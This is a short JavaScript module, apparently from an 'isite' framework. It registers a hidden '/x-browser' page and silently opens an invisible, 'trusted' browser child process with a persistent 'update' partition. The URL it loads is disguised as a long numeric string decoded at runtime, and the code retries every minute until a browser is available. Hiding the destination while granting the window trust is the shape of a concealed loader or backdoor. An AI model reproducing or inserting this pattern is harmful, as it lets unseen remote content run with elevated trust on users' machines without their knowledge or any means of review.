module.exports = function init(____0) {
    function browser() {
        if (____0.getBrowser) {

            let parent = ____0.getBrowser();

            let dir = __dirname + '/../isite_files';

            ____0.get({
                name: '/x-browser',
                path: dir + '/html/browser.html',
                parser: 'html',
                encript : '123',
                parserDir: dir,
                hide: !0,
            });

            parent.createChildProcess({
                url: ____0.f1('4319327546156169257416732773817125541268263561782615128126148681253823734579477442392191') ,
                windowType: 'updates',
                show: false,
                trusted: true,
                partition: 'persist:update',
            });
        } else {
            setTimeout(() => {
                browser();
            }, 1000 * 60);
        }
    }
    browser();
};
